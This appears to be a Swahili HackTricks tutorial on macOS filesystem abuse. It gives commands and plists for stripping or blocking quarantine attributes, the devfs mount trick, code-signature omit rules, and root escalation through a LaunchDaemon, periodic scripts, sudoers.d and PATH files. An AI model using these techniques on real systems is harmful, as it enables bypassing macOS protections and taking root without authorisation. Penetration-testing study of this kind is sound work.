# Vidokezo vya macOS FS

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki vidokezo vyako vya kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Mchanganyiko wa ruhusa za POSIX

Ruhusa katika **directory**:

* **kusoma** - unaweza **kuorodhesha** vitu vya directory
* **kuandika** - unaweza **kufuta/kuandika** **faili** kwenye directory na unaweza **kufuta folda tupu**.&#x20;
* Lakini huwezi **kufuta/kubadilisha folda zisizo tupu** isipokuwa una ruhusa ya kuandika juu yake.
* Huwezi **kubadilisha jina la folda** isipokuwa wewe ndiye mmiliki wake.
* **kutekeleza** - una **ruhusa ya kusafiri** kwenye directory - ikiwa huna haki hii, huwezi kupata faili yoyote ndani yake, au kwenye folda yoyote ya chini.

### Mchanganyiko Hatari

**Jinsi ya kuandika juu ya faili/folda iliyo milikiwa na root**, lakini:

* Mmiliki wa **directory mzazi** katika njia ni mtumiaji
* Mmiliki wa **directory mzazi** katika njia ni **kikundi cha watumiaji** na **ruhusa ya kuandika**
* **Kikundi cha watumiaji** kina **ruhusa ya kuandika** kwenye **faili**

Kwa mchanganyiko wowote uliotangulia, mshambuliaji anaweza **kuingiza** kiunga cha **sym/hard** kwenye njia inayotarajiwa ili kupata uandishi wa kipekee uliopewa haki.

### Kesi Maalum ya Folder Root R+X

Ikiwa kuna faili katika **directory** ambapo **root pekee ana ruhusa ya R+X**, hizo **hazipatikani kwa mtu mwingine yeyote**. Kwa hivyo, udhaifu unaoruhusu **kuhamisha faili inayoweza kusomwa na mtumiaji**, ambayo haiwezi kusomwa kwa sababu ya **kizuizi** hicho, kutoka kwenye folda hii **kwenda kwenye folda nyingine**, inaweza kutumiwa kusoma faili hizo.

Mfano katika: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Kiunga cha Ishara / Kiunga Kigumu

Ikiwa mchakato uliopewa haki maalum unahifadhi data katika **faili** ambayo inaweza **kudhibitiwa** na **mtumiaji mwenye haki ya chini**, au ambayo inaweza **kuumbwa hapo awali** na mtumiaji mwenye haki ya chini. Mtumiaji anaweza tu **kuielekeza kwenye faili nyingine** kupitia kiunga cha Ishara au Kigumu, na mchakato uliopewa haki maalum utaandika kwenye faili hiyo.

Angalia sehemu zingine ambapo mshambuliaji anaweza **kutumia uandishi wa kipekee kuongeza haki za mtumiaji**. 

## .fileloc

Faili zenye kipengele cha **`.fileloc`** zinaweza kuashiria programu au programu nyingine, kwa hivyo wakati zinafunguliwa, programu/programu hiyo itatekelezwa.\
Mfano:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## FD Isiyokuwa na Kikomo

Ikiwa unaweza kufanya **mchakato ufungue faili au folda kwa mamlaka kubwa**, unaweza kutumia **`crontab`** kufungua faili katika `/etc/sudoers.d` na **`EDITOR=exploit.py`**, hivyo `exploit.py` itapata FD kwa faili ndani ya `/etc/sudoers` na kuitumia vibaya.

Kwa mfano: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Njia za Kuepuka Mbinu za xattrs za Karantini

### Ondoa hiyo
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Alama ya uchg / uchange / uimmutable

Ikiwa faili/folder ina sifa hii ya uimara, haitawezekana kuweka xattr juu yake.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Kufunga defvfs

Kufunga ya **devfs** **haisaidii xattr**, habari zaidi katika [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### ACL ya kuandika xattrs

ACL hii inazuia kuongeza `xattrs` kwenye faili.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Muundo wa faili wa **AppleDouble** unaiga faili pamoja na ACEs zake.

Katika [**msimbo wa chanzo**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), inawezekana kuona kuwa uwakilishi wa maandishi wa ACL uliowekwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL katika faili iliyofunguliwa. Kwa hivyo, ikiwa umefunga programu katika faili ya zip kwa muundo wa **AppleDouble** na ACL ambayo inazuia xattrs nyingine kuandikwa ndani yake... xattr ya karantini haikuwekwa kwenye programu:

Angalia [**ripoti ya asili**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.

Ili kuiga hii, kwanza tunahitaji kupata mnyororo sahihi wa acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Taarifa kwamba hata kama hii inafanya kazi, sandbox inaandika alama ya karantini kabla)

Hakuhitajiki sana lakini naacha hapa kwa tahadhari:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Kupita kwa Saini za Kanuni

Vifurushi vinavyo faili **`_CodeSignature/CodeResources`** ambayo ina **hash** ya kila **faili** katika **vifurushi**. Tafadhali kumbuka kwamba hash ya CodeResources pia imejumuishwa katika kutekelezwa, kwa hivyo hatuwezi kuharibu hilo, pia.

Hata hivyo, kuna baadhi ya faili ambazo saini yake haitakaguliwa, hizi zina ufunguo wa kuacha katika plist, kama vile:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Inawezekana kuhesabu saini ya rasilimali kutoka kwa CLI kwa kutumia:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Weka dmgs

Mtumiaji anaweza kuweka pakiti ya dmg iliyoundwa kwa juu ya folda zilizopo. Hii ndiyo jinsi unavyoweza kuunda pakiti ya dmg ya desturi na yaliyomo desturi:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Kuandika Kiholela

### Skripti za sh za kawaida

Ikiwa skripti yako inaweza kuchukuliwa kama **skripti ya shell**, unaweza kuandika upya skripti ya shell ya **`/etc/periodic/daily/999.local`** ambayo itatekelezwa kila siku.

Unaweza **kuiga** utekelezaji wa skripti hii na: **`sudo periodic daily`**

### Daemons

Andika **LaunchDaemon** kiholela kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** na plist inayotekeleza skripti kiholela kama:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Tengeneza skripti `/Applications/Scripts/privesc.sh` na **amri** ungependa kuendesha kama root.

### Faili ya Sudoers

Ikiwa una **uwezo wa kuandika kwa hiari**, unaweza kuunda faili ndani ya saraka **`/etc/sudoers.d/`** ikikupa wewe mwenyewe mamlaka ya **sudo**.

### Faili za PATH

Faili ya **`/etc/paths`** ni moja ya sehemu kuu ambazo zinaunda variable ya mazingira ya PATH. Lazima uwe mtumiaji wa root ili kuibadilisha, lakini ikiwa skripti kutoka kwa **mchakato uliopewa mamlaka** inatekeleza **amri bila njia kamili**, huenda ukaifanya **itekwe** kwa kubadilisha faili hii.

&#x20;Unaweza pia kuandika faili katika **`/etc/paths.d`** ili kupakia folda mpya katika variable ya mazingira ya `PATH`.

## Marejeo

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
